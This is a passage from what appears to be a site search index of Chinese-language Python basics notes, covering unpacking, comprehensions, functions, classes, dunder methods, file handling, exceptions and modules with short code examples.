<li>\u661f\u53f7\u8868\u8fbe\u5f0f<ul> <li>\u53ef\u4ee5\u7528\u6765\u5728\u53ef\u8fed\u4ee3\u5bf9\u8c61\u5185\u90e8\u89e3\u5305</li> <li>\u4e5f\u53ef\u7528\u6765\u6807\u8bb0\u4e00\u4e2a\u53d8\u91cf\u5305\u542b\u591a\u4e2a\u503c</li> </ul> </li> <li>for \u5faa\u73af\u53ef\u4ee5\u89e3\u5305</li> </ul> <pre><code>t = (1, 2, 3)\na, b, c = t # a = 1, b = 2, c = 3\nt = (1, 2, (3, 4))\na, b, (c, d) = t # c = 3, d = 4\n\nl = [1, 2, *[3, 4]] # [3, 4] \u88ab\u89e3\u5305\n## l = [1, 2, 3, 4]\na, *b = [1, 2, 3, 4]\n## a = 1, b = [2, 3, 4]\n\nlst = [[1, 2], [3, 4]]\nfor a, b in lst:\n    ... # \u7b2c\u4e00\u6b21\u5faa\u73af a, b \u4e3a 1, 2\n        # \u7b2c\u4e8c\u6b21\u5faa\u73af a, b \u4e3a 3, 4\n</code></pre>"},{"location":"cs/pl/python/basic/#for_2","title":"for \u5faa\u73af\u6280\u5de7","text":"<ul> <li>enumerate \u8ba1\u6570<ul> <li>\u53ef\u4ee5\u6307\u5b9a\u521d\u59cb\u503c</li> </ul> </li> <li>zip \u540c\u65f6\u5faa\u73af\u591a\u4e2a\u53ef\u8fed\u4ee3\u5bf9\u8c61<ul> <li>\u5faa\u73af\u6b21\u6570\u4e3a\u6700\u77ed\u7684\u5bf9\u8c61\u7684\u957f\u5ea6</li> </ul> </li> </ul> <pre><code>for i, value in enumerate(lst):\n    ... # i \u4f9d\u6b21\u4e3a 0\uff0c1\uff0c2\uff0c\u2026\u2026\n\nfor i, value in enumerate(lst, 1):\n    ... # i \u4f9d\u6b21\u4e3a 1\uff0c2\uff0c3\uff0c\u2026\u2026\n\nfor a, b in zip(lst1, lst2):\n    ... # a \u5728 lst1 \u4e2d\u5faa\u73af\n        # b \u5728 lst2 \u4e2d\u5faa\u73af\n</code></pre>"},{"location":"cs/pl/python/basic/#_19","title":"\u5217\u8868\u63a8\u5bfc","text":"<ul> <li>\u4e00\u79cd\u5f88\u65b9\u4fbf\u7684\u751f\u6210\u5217\u8868\u7684\u65b9\u5f0f</li> <li>\u5373\u5728\u5217\u8868\u4e2d\u5305\u542b\u5faa\u73af\uff0c\u9010\u6b21\u8bb0\u5f55\u5faa\u73af\u524d\u8868\u8fbe\u5f0f\u7684\u503c</li> <li>\u53ef\u4ee5\u6709\u591a\u91cd\u5faa\u73af\uff0c\u5373\u751f\u6210\u7b1b\u5361\u5c14\u79ef</li> <li>\u53ef\u4ee5\u5305\u542b\u6761\u4ef6\uff0c\u5373\u5728\u6761\u4ef6\u6210\u7acb\u65f6\u624d\u8bb0\u5f55\u503c</li> <li>\u5217\u8868\u63a8\u5bfc\u4e2d\u7684\u5faa\u73af\u53d8\u91cf\u6709\u5c40\u90e8\u4f5c\u7528\u57df<ul> <li>\u5373\u5728\u5217\u8868\u63a8\u5bfc\u5916\u4e0d\u80fd\u8bbf\u95ee\u5faa\u73af\u53d8\u91cf</li> </ul> </li> </ul> <pre><code>lst = []\nfor i in range(1, 10):\n    lst.append(i**2)\n## \u7b49\u4ef7\u4e8e\nlst = [i**2 for i in range(1, 10)]\n\nlst1 = [x*y for x in l1 for y in l2]\n\nlst2 = [... for ... in ... if ...]\n</code></pre>"},{"location":"cs/pl/python/basic/#_20","title":"\u751f\u6210\u5143\u7ec4/\u5b57\u5178","text":"<ul> <li>\u53ef\u4ee5\u4f7f\u7528\u548c\u5217\u8868\u63a8\u5bfc\u7c7b\u4f3c\u7684\u65b9\u6cd5\u751f\u6210\u5143\u7ec4\u548c\u5b57\u5178</li> <li>\u751f\u6210\u5143\u7ec4\u7684\u65f6\u5019\u8981\u7528 tuple()<ul> <li>\u53ea\u5199 () \u7684\u8bdd\u5219\u53ea\u662f\u751f\u6210\u5668\u8868\u8fbe\u5f0f</li> </ul> </li> <li>\u751f\u6210\u5b57\u5178\u65f6\u5faa\u73af\u524d\u7528 : \u5c06\u952e\u503c\u9694\u5f00</li> </ul> <pre><code>tuple(i**2 for i in range(1, 10))\n\n(i**2 for i in range(1, 10))\n## ^  generator object\n\n{a: b for a in ... for b in ... }\n</code></pre>"},{"location":"cs/pl/python/basic/#_21","title":"\u63a7\u5236\u5faa\u73af","text":"<ul> <li>\u548c\u5176\u5b83\u8bed\u8a00\u4e00\u6837\uff0c\u5728\u5faa\u73af\u4ee3\u7801\u5757\u4e2d\u53ef\u4ee5\u63a7\u5236\u5faa\u73af\u7684\u8fdb\u884c</li> <li>break \u7acb\u523b\u7ed3\u675f\u5faa\u73af</li> <li>continue \u7acb\u523b\u8fdb\u884c\u4e0b\u4e00\u8f6e\u5faa\u73af</li> </ul>"},{"location":"cs/pl/python/basic/#while","title":"while \u5faa\u73af","text":"<ul> <li>while \u5faa\u73af\u5373\u8fdb\u884c\u6761\u4ef6\u68c0\u67e5\uff0c\u5982\u679c\u4e3a True \u5219\u7ee7\u7eed\u8fd0\u884c\u76f4\u5230\u6761\u4ef6\u4e0d\u6ee1\u8db3\u505c\u6b62</li> </ul> <pre><code>while condition:\n    ...\n</code></pre>"},{"location":"cs/pl/python/basic/#_22","title":"\u51fd\u6570","text":""},{"location":"cs/pl/python/basic/#_23","title":"\u51fd\u6570\u5b9a\u4e49","text":"<ul> <li>\u4f7f\u7528 def \u5173\u952e\u5b57\u6765\u5b9a\u4e49\u51fd\u6570</li> <li>\u5148\u51fd\u6570\u540d\uff0c\u7136\u540e\u62ec\u53f7\u5217\u51fa\u53c2\u6570\uff0c\u4e0b\u9762\u63a5\u4ee3\u7801\u5757</li> <li>\u4f7f\u7528 return \u8fd4\u56de<ul> <li>\u6ca1\u6709 return \u8fd0\u884c\u5230\u7ed3\u5c3e\uff0c\u8fd4\u56de None</li> <li>\u53ea\u6709 return\uff0c\u8fd4\u56de None</li> <li>return \u540e\u63a5\u5185\u5bb9\uff0c\u8fd4\u56de\u5185\u5bb9</li> <li>return \u7684\u503c\u7c7b\u578b\u4e0d\u8981\u6c42\u4e00\u81f4</li> <li>return \u53ef\u4ee5\u8fd4\u56de\u591a\u4e2a\u503c\uff08\u5229\u7528\u5143\u7ec4\uff09</li> </ul> </li> </ul> <pre><code>def func_name(arg1, arg2):\n    ...\n\ndef func_name(arg1, arg2):\n    ...\n    return ...\n\ndef func_name(arg1, arg2):\n    ...\n    return ..., ...\n</code></pre>"},{"location":"cs/pl/python/basic/#_24","title":"\u51fd\u6570\u53c2\u6570","text":"<ul> <li>\u62ec\u53f7\u4e2d\u8981\u5217\u51fa\u53c2\u6570\u540d\uff0c\u4f9b\u51fd\u6570\u4f53\u5185\u4f7f\u7528</li> <li>\u53ef\u4ee5\u5728\u53c2\u6570\u540e\u63a5\u7b49\u53f7\u8d4b\u9ed8\u8ba4\u503c<ul> <li>\u4f7f\u7528\u9ed8\u8ba4\u503c\u7684\u53c2\u6570\u5728\u8c03\u7528\u65f6\u53ef\u4ee5\u4e0d\u7528\u4f20</li> </ul> </li> <li>\u5229\u7528 * \u6765\u63a5\u6536\u4efb\u610f\u591a\u53c2\u6570<ul> <li>\u63a5\u6536\u8fdb\u6765\u662f\u4e00\u4e2a\u5143\u7ec4</li> <li>* \u53c2\u6570\u540e\u9762\u4e0d\u80fd\u518d\u6709\u5176\u5b83\u975e\u5173\u952e\u5b57\u53c2\u6570</li> </ul> </li> <li>\u5229\u7528 ** \u6765\u63a5\u6536\u4efb\u610f\u591a\u5173\u952e\u5b57\u53c2\u6570<ul> <li>\u63a5\u6536\u8fdb\u6765\u662f\u4e00\u4e2a\u5b57\u5178</li> </ul> </li> </ul> <pre><code>def func(arg1, arg2):\n    ...\n\ndef func(arg1, arg2=\"...\"): # \u9ed8\u8ba4\u503c\n    ...\n\ndef func(arg1, *arg2): # \u4efb\u610f\u591a\u53c2\u6570\n    ...\n\ndef func(arg1, **arg2): # \u4efb\u610f\u591a\u5173\u952e\u5b57\u53c2\u6570\n    ...\n\ndef func(arg1, *arg2, **arg3):\n    ... # *arg2 \u540e\u53ef\u4ee5\u52a0 **arg3\n</code></pre>"},{"location":"cs/pl/python/basic/#_25","title":"\u51fd\u6570\u8c03\u7528","text":"<ul> <li>\u901a\u8fc7 \u51fd\u6570\u540d(\u53c2\u6570) \u6765\u8c03\u7528\u51fd\u6570\uff0c\u5f97\u5230\u8fd4\u56de\u503c</li> <li>\u76f4\u63a5\u4f20\u53c2\u7684\u8bdd\u8981\u5c06\u53c2\u6570\u4e0e\u5b9a\u4e49\u5bf9\u5e94\u4e0a</li> <li>\u901a\u8fc7\u5173\u952e\u5b57\u4f20\u53c2\uff08\u53c2\u6570\u540d\uff09\u53ef\u4ee5\u6253\u4e71\u987a\u5e8f</li> <li>\u5e26\u6709\u9ed8\u8ba4\u503c\u7684\u53c2\u6570\u5982\u679c\u4e0d\u4f20\u5219\u4f7f\u7528\u9ed8\u8ba4\u503c</li> <li>\u5982\u679c\u8bfb\u4efb\u610f\u591a\u5173\u952e\u5b57\u53c2\u6570\uff0c\u5219\u591a\u4f59\u7684\u8bfb\u5230\u5b57\u5178\u4e2d</li> </ul> <pre><code>def func(a, b):\n    ...\n\nfunc(1, 2) # a = 1, b = 2\nfunc(b=1, a=2) # a = 2, b = 1\n\ndef func2(a, **b):\n    ...\n\nfunc2(a=1, b=2, c=3)\n## a = 1, b = {\"b\": 2, \"c\": 3}\n</code></pre>"},{"location":"cs/pl/python/basic/#_26","title":"*\u5f15\u7528\u53d8\u91cf","text":"<ul> <li>python \u4e2d\u7684\u53d8\u91cf\u90fd\u662f\u5f15\u7528\u7684\uff08\u8fd9\u4e5f\u5c31\u662f\u4e3a\u4ec0\u4e48\u524d\u9762\u8bf4\u4e0d\u8981\u5c06\u53d8\u91cf\u7406\u89e3\u4e3a\u76d2\u5b50\uff09</li> <li>\u7528 = \u5b9e\u9645\u4e0a\u662f\u5b9a\u4e49\u4e86\u4e00\u4e2a\u522b\u540d<ul> <li>lst1 = lst2\uff0c\u5219 lst1 \u548c lst2 \u4f1a\u540c\u65f6\u53d8\u5316\uff08\u8981\u7528 [:] \u521b\u5efa\u526f\u672c\uff09</li> <li>\u6570\u503c\u7c7b\u578b\u6709\u4f18\u5316\uff0c\u6240\u4ee5\u4e0d\u4f1a\u8fd9\u6837</li> <li><code>==</code> \u68c0\u67e5\u503c\u662f\u5426\u76f8\u7b49\uff0cis \u68c0\u67e5\u503c\u662f\u5426\u76f8\u540c</li> <li>\u89c2\u5bdf pythontutor.com </li> </ul> </li> <li>\u51fd\u6570\u53c2\u6570\u4f20\u9012\u53ea\u6709\u201c\u5171\u4eab\u4f20\u53c2\u201d\u4e00\u79cd\u5f62\u5f0f\uff08\u5373\u4f20\u5f15\u7528\uff09<ul> <li>\u53ef\u53d8\u53d8\u91cf\uff08\u4f8b\u5982\u5217\u8868\uff09\u5728\u51fd\u6570\u5185\u90e8\u53ef\u4ee5\u88ab\u6539\u53d8</li> <li>\u907f\u514d\u5411\u51fd\u6570\u4f20\u9012\u53ef\u53d8\u53d8\u91cf\uff08\u5217\u8868\u53ef\u4f20\u5165 [:] \u521b\u5efa\u7684\u526f\u672c\uff09</li> </ul> </li> </ul>"},{"location":"cs/pl/python/basic/#_27","title":"\u533f\u540d\u51fd\u6570","text":"<ul> <li>\u53ef\u4ee5\u901a\u8fc7 lambda \u8868\u8fbe\u5f0f\u6765\u5b9a\u4e49\u533f\u540d\u51fd\u6570</li> <li>lambda \u8f93\u5165: \u8f93\u51fa\u8868\u8fbe\u5f0f</li> <li>\u53ef\u4ee5\u6709\u591a\u4e2a\u8f93\u5165</li> <li>\u53ef\u4ee5\u5c06\u4e00\u4e2a\u51fd\u6570\u8d4b\u503c\u7ed9\u4e00\u4e2a\u53d8\u91cf</li> <li>\u907f\u514d\u7528 lambda \u8d4b\u503c\u7684\u5f62\u5f0f\u5b9a\u4e49\u51fd\u6570<ul> <li>\u4f8b\u5982 __name__ \u5c5e\u6027\u4e0d\u4f1a\u662f\u51fd\u6570\u540d\uff0c\u800c\u662f \"\\&lt;lambda&gt;\"</li> </ul> </li> </ul> <pre><code>lambda a: a**2 + 2*a + 1\n(lambda a: a**2 + 2*a + 1)(2) # 9\n\nlambda a, b: a*2 + b\n\nf = lambda a: a**2 + 2*a + 1\n## \u8fd1\u4f3c\u7b49\u4ef7\u4e8e\ndef f(a):\n    return a**2 + 2*a + 1\n</code></pre>"},{"location":"cs/pl/python/basic/#_28","title":"\u7528\u6237\u8f93\u5165","text":"<ul> <li>\u8bfb\u53d6\u7528\u6237\u8f93\u5165\u4f7f\u7528\u5185\u7f6e\u7684 input \u51fd\u6570</li> <li>\u51fd\u6570\u53c2\u6570\u4e3a\u8981\u663e\u793a\u7684\u63d0\u793a\u7b26\uff0c\u4f8b\u5982 input(\"&gt; \")</li> <li>\u51fd\u6570\u7684\u8fd4\u56de\u503c\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32</li> <li>\u6bcf\u6b21\u8bfb\u5165\u4e00\u884c\uff08\u5373\u8bfb\u5230\u6362\u884c\u4e3a\u6b62\uff09</li> </ul>"},{"location":"cs/pl/python/basic/#_29","title":"\u9ad8\u9636\u51fd\u6570\u7528\u6cd5","text":"<ul> <li>\u63a5\u6536\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\u7684\u51fd\u6570\u88ab\u79f0\u4e3a\u9ad8\u9636\u51fd\u6570</li> <li>\u6bd4\u8f83\u5e38\u7528\u7684\u6709 map\u3001filter</li> </ul> <pre><code>list(map(lambda x: x*2, [1, 2]))\n## [2, 4]\nlist(filter(lambda x: x&gt;1, [1, 2, 3]))\n## [2, 3]\n</code></pre>"},{"location":"cs/pl/python/basic/#_30","title":"\u7c7b\u4e0e\u9762\u5411\u5bf9\u8c61","text":""},{"location":"cs/pl/python/basic/#_31","title":"\u7c7b","text":"<ul> <li>\u7c7b\u53ef\u4ee5\u770b\u6210\u5305\u542b\u4e00\u4e9b\u5c5e\u6027\u548c\u65b9\u6cd5\u7684\u6846\u67b6</li> <li>\u6839\u636e\u7c7b\u6765\u521b\u5efa\u5bf9\u8c61 -&gt; \u5b9e\u4f8b\u5316</li> <li>\u7528 class \u5173\u952e\u5b57\u6765\u5b9a\u4e49\u7c7b</li> <li>\u7c7b\u4e2d\u7684\u51fd\u6570 -&gt; \u65b9\u6cd5<ul> <li>\u7279\u6b8a\u65b9\u6cd5 __init__\uff0c\u5728\u7c7b\u5b9e\u4f8b\u5316\u7684\u65f6\u5019\u4f1a\u88ab\u81ea\u52a8\u8c03\u7528</li> <li>\u5176\u5b83\u4e00\u822c\u7684\u65b9\u6cd5\u7b2c\u4e00\u4e2a\u53c2\u6570\u90fd\u8981\u4e3a\"self\"\uff0c\u8c03\u7528\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u4f20\u5165</li> </ul> </li> <li>\u76f4\u63a5\u5199\u5728\u7c7b\u4e2d\u7684\u662f\u5c5e\u6027\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4e3a self.\\&lt;name&gt; \u8d4b\u503c\u7684\u5f62\u5f0f\u521b\u5efa\u5c5e\u6027</li> <li>\u7528\u7c7b\u4f3c\u51fd\u6570\u8c03\u7528\u7684\u5f62\u5f0f\u5b9e\u4f8b\u5316\u7c7b\uff0c\u53c2\u6570\u4e3a__init__\u65b9\u6cd5\u7684\u53c2\u6570</li> <li>\u76f4\u63a5\u901a\u8fc7 .\\&lt;method&gt; .\\&lt;attribute&gt; \u7684\u5f62\u5f0f\u8c03\u7528\u65b9\u6cd5/\u83b7\u53d6\u5c5e\u6027</li> </ul> <pre><code>class ClassName():\n    a = 1\n    def __init__(self, arg1, arg2):\n        self.arg1 = arg1\n        self.arg2 = arg2\n    def method(self):\n        print(self.arg1, self.arg2, self.a)\n\nobj = ClassName(2, 3)\nobj.method() # 2 3 1\nprint(obj.a, obj.arg1) # 1 2\n</code></pre>"},{"location":"cs/pl/python/basic/#_32","title":"\u7c7b\u7684\u7ee7\u627f","text":"<ul> <li>\u5728 class \u5b9a\u4e49\u7684\u62ec\u53f7\u4e2d\u52a0\u4e0a\u53e6\u4e00\u4e2a\u7c7b\u540d\u5219\u8868\u793a\u7ee7\u627f\u81ea\u90a3\u4e2a\u7c7b\u5b9a\u4e49\u4e00\u4e2a\u5b50\u7c7b</li> <li>\u5b50\u7c7b\u4f1a\u7ee7\u627f\u7236\u7c7b\u7684\u6240\u6709\u5c5e\u6027\u548c\u65b9\u6cd5</li> <li>\u5b50\u7c7b\u7f16\u5199\u548c\u7236\u7c7b\u540d\u5b57\u4e00\u6837\u7684\u65b9\u6cd5\u4f1a\u91cd\u8f7d</li> <li>\u5728\u91cd\u8f7d\u7684\u65b9\u6cd5\u4e2d\u8c03\u7528\u7236\u7c7b\u7684\u539f\u65b9\u6cd5\u4f7f\u7528 super()</li> <li>\u4e5f\u53ef\u4ee5\u4e3a\u5b50\u7c7b\u5b9a\u4e49\u72ec\u6709\u7684\u65b9\u6cd5</li> </ul> <pre><code>class ClassA():\n    def __init__(self, a):\n        self.a = a\n    def print(self):\n        print(self.a)\n\nclass ClassB(ClassA):\n    def __init__(self, a):\n        super().__init__(a)\n        self.a *= 2\n\nobj = ClassB(1)\nobj.print() # 2\n</code></pre>"},{"location":"cs/pl/python/basic/#_33","title":"\u79c1\u6709\uff1f","text":"<ul> <li>python \u4e2d\u7c7b\u5e76\u6ca1\u6709\u4e25\u683c\u79c1\u6709\u7684\u5c5e\u6027</li> <li>\u53cc\u4e0b\u5212\u7ebf\u5f00\u5934\u7684\u5c5e\u6027\u4f1a\u88ab\u9690\u85cf\uff0c\u4e0d\u80fd\u76f4\u63a5\u8bfb\u53d6</li> <li>\u4f46\u8fd9\u79cd\u5c5e\u6027\u53ef\u4ee5\u901a\u8fc7 _\u7c7b\u540d__\u5c5e\u6027 \u4f46\u65b9\u5f0f\u8bfb\u53d6\u5230</li> <li>\u4f7f\u7528\u53cc\u4e0b\u5212\u7ebf\u5f00\u5934\u7684\u5c5e\u6027\u53ef\u4ee5\u8f7b\u5fae\u4fdd\u62a4\u5c5e\u6027\uff0c\u4f46\u5e76\u4e0d\u4ee3\u8868\u5176\u662f\u79c1\u6709\u7684</li> </ul> <pre><code>class A():\n    a = 1\n    _a = 2\n    __a = 3\n\nobj = A()\nprint(obj.a) # 1\nprint(obj._a) # 2\nprint(obj.__a) # AttributeError\nprint(obj._A__a) # 3\n</code></pre>"},{"location":"cs/pl/python/basic/#_34","title":"\u4e00\u5207\u7686\u5bf9\u8c61\uff1f","text":"<ul> <li>python \u4e2d\u5373\u4f7f\u6700\u7b80\u5355\u7684\u6574\u6570\u4e5f\u662f\u4e00\u4e2a\u7c7b\u7684\u5b9e\u4f8b</li> <li>\u901a\u8fc7 dir(...) \u67e5\u770b\u4e00\u4e2a\u5bf9\u8c61\u7684\u6240\u6709\u5c5e\u6027/\u65b9\u6cd5</li> <li>\u6709\u5f88\u591a\u53cc\u4e0b\u5212\u7ebf\u5f00\u5934\u3001\u53cc\u4e0b\u5212\u7ebf\u7ed3\u5c3e\u7684\u65b9\u6cd5\uff0c\u6210\u4e3a\u9b54\u672f\u65b9\u6cd5\uff08dunder method\uff09</li> </ul>"},{"location":"cs/pl/python/basic/#_35","title":"\u9b54\u672f\u65b9\u6cd5","text":"<ul> <li>\u5f88\u591a\u51fd\u6570\u3001\u8868\u8fbe\u5f0f\u5176\u5b9e\u662f\u901a\u8fc7\u8c03\u7528\u7c7b\u7684\u9b54\u672f\u65b9\u6cd5\u6765\u5b9e\u73b0\u7684</li> <li>len(obj) \u8c03\u7528 obj.__len__()</li> <li>obj[...] \u8c03\u7528 obj.__getitem__(...)</li> <li>a in obj \u8c03\u7528 obj.__contains__(a)</li> <li>bool(obj) \u8c03\u7528 obj.__bool__()</li> <li>\u51fd\u6570\u7684\u8c03\u7528\u672c\u8d28\u4e0a\u662f\u8c03\u7528 func.__call__()</li> <li>a + b \u8c03\u7528 a.__add__(b)</li> <li>\u2026\u2026</li> </ul> <p>\u4e00\u4e2a\u4f8b\u5b50\uff1a</p> <ul> <li>lst[a:b:c] \u5207\u7247\u64cd\u4f5c</li> <li>\u5176\u4e2d\u5207\u7247\u4e5f\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5b83\u662f\u4e00\u4e2a slice \u7c7b\u7684\u5b9e\u4f8b<ul> <li>\u6240\u4ee5\u5b83\u7b49\u4ef7\u4e8e lst[slice(a, b, c)]</li> </ul> </li> <li>\u800c\u901a\u8fc7 [] \u7684\u64cd\u4f5c\u53c8\u662f\u901a\u8fc7 __getitem__ \u9b54\u672f\u65b9\u6cd5\u5b9e\u73b0\u7684<ul> <li>\u6240\u4ee5\u5b83\u53c8\u7b49\u4ef7\u4e8e lst.__getitem__(slice(a, b, c))</li> </ul> </li> <li>__getitem__ \u65b9\u6cd5\u4e2d\u5904\u7406\u4e86 slice\uff0c\u8bfb\u53d6 abc \u7684\u503c\uff0c\u518d\u5904\u7406\u8fd4\u56de\u4e00\u4e2a\u65b0\u5217\u8868</li> </ul>"},{"location":"cs/pl/python/basic/#_36","title":"\u6742\u9879\u5185\u5bb9","text":""},{"location":"cs/pl/python/basic/#_37","title":"\u6587\u4ef6\u64cd\u4f5c","text":"<ul> <li>open \u51fd\u6570\uff0c\u4f20\u5165\u6587\u4ef6\u540d\u3001\u6253\u5f00\u6a21\u5f0f</li> <li>\u6253\u5f00\u6a21\u5f0f\uff08\u53ef\u4ee5\u53e0\u52a0\uff09\uff1ar \u8bfb\uff08\u9ed8\u8ba4\uff09\u3001w \u5199\u3001x \u521b\u5efa\u5e76\u5199\u3001a \u5199\u5728\u672b\u5c3e\u3001b \u5b57\u8282\u6a21\u5f0f\u3001t \u6587\u672c\u6a21\u5f0f\uff08\u9ed8\u8ba4\uff09</li> <li>\u8bfb\u53d6<ul> <li>\u6587\u672c\u6a21\u5f0f\u5efa\u8bae\u52a0\u4e0a encoding\uff0c\u4e0d\u7136\u5bb9\u6613\u62a5\u9519</li> <li>f.read() \u8bfb\u53d6\u5168\u90e8\u5185\u5bb9\uff08\u5b57\u8282\u6a21\u5f0f\u5f97\u5230\u5b57\u8282\u5e8f\u5217\uff09</li> <li>f.readline() \u8bfb\u53d6\u4e00\u884c</li> <li>f.readlines() \u8bfb\u53d6\u6240\u6709\u884c\uff0c\u8fd4\u56de\u4e00\u4e2a\u5217\u8868</li> </ul> </li> <li>\u5199\u5165<ul> <li>\u6587\u672c\u6a21\u5f0f\u540c\u6837\u5efa\u8bae\u52a0\u4e0a encoding</li> <li>f.write(...) \u76f4\u63a5\u5199\u5165</li> <li>f.writelines(...) \u4f20\u5165\u5217\u8868\uff0c\u5143\u7d20\u95f4\u6362\u884c\u5199\u5165</li> </ul> </li> <li>\u901a\u8fc7\u8fd9\u79cd\u5f62\u5f0f\u64cd\u4f5c\u6587\u4ef6\u8bb0\u5f97\u7528\u5b8c\u540e\u8981 f.close()</li> </ul> <pre><code>f = open(\"filename\", \"r\", encoding=\"utf-8\")\ns = f.read()            # a str\n## line = f.readline()   # a str\n## lines = f.readlines() # a list\n...\nf.close()\n\nf = open(\"filename\", \"w\", encodeing=\"utf-8\")\nf.write(\"...\")\nf.writelines([\"...\", \"...\"])\n...\nf.close()\n</code></pre>"},{"location":"cs/pl/python/basic/#with","title":"with \u5757","text":"<ul> <li>with ... as ...: \u5f00\u542f\u4e00\u4e2a\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668</li> <li>\u5e38\u7528\u5728\u6587\u4ef6 open \u4e0a<ul> <li>with \u5757\u5f00\u59cb\u81ea\u52a8\u6253\u5f00</li> <li>with \u5757\u7ed3\u675f\u81ea\u52a8\u7ed3\u675f</li> </ul> </li> <li>with \u5757\u7ed3\u675f\u540e\u53d8\u91cf\u4ecd\u4f1a\u7559\u5b58</li> </ul> <pre><code>with open(\"file\", \"r\", encoding=\"utf-8\") as f:\n    s = f.read()\n    ...\n\nprint(f.closed)  # True\n</code></pre>"},{"location":"cs/pl/python/basic/#_38","title":"\u5f02\u5e38\u4e0e\u5904\u7406","text":"<ul> <li>\u4ea7\u751f\u9519\u8bef -&gt; \u629b\u51fa\u5f02\u5e38 -&gt; \u7a0b\u5e8f\u7ed3\u675f</li> <li>raise \u5173\u952e\u5b57\u629b\u51fa\u5f02\u5e38</li> <li>try-except \u5757\u6355\u83b7\u5f02\u5e38<ul> <li>\u53ef\u4ee5\u6709\u591a\u4e2a except\u3001\u4e0d\u53ef\u4ee5\u6ca1\u6709</li> <li>except \u540e\u63a5\u5f02\u5e38\u7c7b\uff08\u6ca1\u6709\u5219\u6355\u83b7\u6240\u6709\uff09</li> <li>as \u5b57\u53e5\u5b58\u4e0b\u5f02\u5e38</li> </ul> </li> <li>finally \u8bed\u53e5<ul> <li>\u4e0d\u7ba1\u662f\u5426\u6709\u5f02\u5e38\u90fd\u4f1a\u8fd0\u884c</li> </ul> </li> </ul> <pre><code>raise ...\nraise RuntimeError(\"...\")\n\ntry:\n    input(\"&gt;&gt;&gt; \")\nexcept KeyboardInterrupt:\n    print(\"Good bye\")\n\ntry:\n    print(1 / 0)\nexcept ZeroDivisionError as e:\n    print(\"can't devide by zero\")\n    raise e\nfinally:\n    print(\"finished\")\n</code></pre>"},{"location":"cs/pl/python/basic/#if-else","title":"if \u5916\u7684 else \u8bed\u53e5","text":"<ul> <li>else \u5757\u4e0d\u4ec5\u4ec5\u8ddf\u7740 if \u624d\u80fd\u4f7f\u7528</li> <li>for-else<ul> <li>for \u5faa\u73af\u7ed3\u675f\u624d\u4f1a\u8fd0\u884c</li> <li>for \u5faa\u73af\u88ab break \u4e86\u4e0d\u4f1a\u8fd0\u884c</li> </ul> </li> <li>while-else<ul> <li>condition \u4e0d\u6210\u7acb\u9000\u51fa\u624d\u4f1a\u8fd0\u884c</li> <li>\u5faa\u73af\u88ab break \u7ec8\u6b62\u4e86\u4e0d\u4f1a\u8fd0\u884c</li> </ul> </li> <li>try-else<ul> <li>try \u5757\u4e2d\u6ca1\u6709\u5f02\u5e38\u51fa\u73b0\u624d\u4f1a\u8fd0\u884c</li> <li>else \u5757\u4e2d\u5f02\u5e38\u4e0d\u4f1a\u88ab\u524d\u9762\u7684 except \u6355\u83b7</li> </ul> </li> <li>\u7a0b\u5e8f\u6d41\u8df3\u5230\u5757\u5916\u4e86\u4e0d\u4f1a\u8fd0\u884c\uff08return \u7b49\uff09</li> </ul> <pre><code>for value in lst:\n    ...\nelse:\n    ...\n\nwhile condition:\n    ...\nelse:\n    ...\n\ntry:\n    ...\nexcept ...:\n    ...\nelse:\n    ...\n</code></pre>"},{"location":"cs/pl/python/basic/#_39","title":"\u6a21\u5757\u4e0e\u5bfc\u5165","text":"<ul> <li>\u6a21\u5757\u53ef\u4ee5\u662f\u4e00\u4e2a\u5355\u72ec\u7684 .py \u6587\u4ef6\uff0c\u4e5f\u53ef\u4ee5\u662f\u4e00\u4e2a\u6587\u4ef6\u5939<ul> <li>\u6587\u4ef6\u5939\u76f8\u5f53\u4e8e\u5bfc\u5165\u5176\u4e0b __init__.py \u6587\u4ef6</li> </ul> </li> <li>\u6a21\u5757\u4e2d\u6b63\u5e38\u7f16\u5199\u51fd\u6570\u3001\u7c7b\u3001\u8bed\u53e5</li> <li>\u901a\u8fc7 import \u8bed\u53e5\u5bfc\u5165\u6a21\u5757<ul> <li>import code</li> <li>import code as cd</li> <li>from code import ...</li> <li>from code import *</li> </ul> </li> <li>\u5bfc\u5165\u65f6\u76f8\u5f53\u4e8e\u8fd0\u884c\u4e86\u4e00\u904d\u5bfc\u5165\u7684\u4ee3\u7801</li> </ul> <p><pre><code>## code.py\nprint(\"hello\")\ndef f():\n    print(\"call func in code.py\")\n...\n</code></pre> <pre><code>import code # hello\ncode.f()\nimport code as cd # hello\ncd.f()\nfrom code import f # hello\nf()\nfrom code import * # hello\nf()\n</code></pre></p>"},{"location":"cs/pl/python/basic/#main","title":"\u201dmain \u51fd\u6570\u201c","text":"<ul> <li>\u9632\u6b62\u5bfc\u5165\u65f6\u8fd0\u884c\u4ee3\u7801</li> <li>\u53ea\u5141\u8bb8\u76f4\u63a5\u8fd0\u884c\u811a\u672c\u65f6\u8fd0\u884c</li> <li>\u901a\u8fc7\u5224\u65ad __name__<ul> <li>\u5982\u679c\u662f\u76f4\u63a5\u8fd0\u884c\uff0c\u5219\u5176\u7b49\u4e8e\u5b57\u7b26\u4e32 __main__</li> <li>\u5982\u679c\u662f\u88ab\u5bfc\u5165\u7684\uff0c\u5219\u5176\u7b49\u4e8e\u6a21\u5757\u540d</li> </ul> </li> </ul> <p><pre><code>## code.py\n...\nif __name__ == \"__main__\":\n    print(\"hello\")\nelse:\n    print(__name__)\n</code></pre> <pre><code>import code # code\n</code></pre> <pre><code>$ python code.py # hello\n</code></pre></p>"},{"location":"cs/pl/python/basic/#_40","title":"\u5185\u90e8\u6a21\u5757","text":"<p>python \u81ea\u5e26\u4e86\u5f88\u591a\u5b9e\u7528\u7684\u6a21\u5757\uff08\u6807\u51c6\u5e93\uff09</p> <ul> <li>os\u3001sys\uff1a\u7cfb\u7edf\u64cd\u4f5c</li> <li>math\uff1a\u6570\u5b66\u8fd0\u7b97</li> <li>re\uff1a\u6b63\u5219\u8868\u8fbe\u5f0f</li> <li>datetime\uff1a\u65e5\u671f\u4e0e\u65f6\u95f4</li> <li>subprocess\uff1a\u5b50\u8fdb\u7a0b\u7ba1\u7406</li> <li>argparse\uff1a\u547d\u4ee4\u884c\u53c2\u6570\u89e3\u6790</li> <li>logging\uff1a\u65e5\u5fd7\u8bb0\u5f55</li> 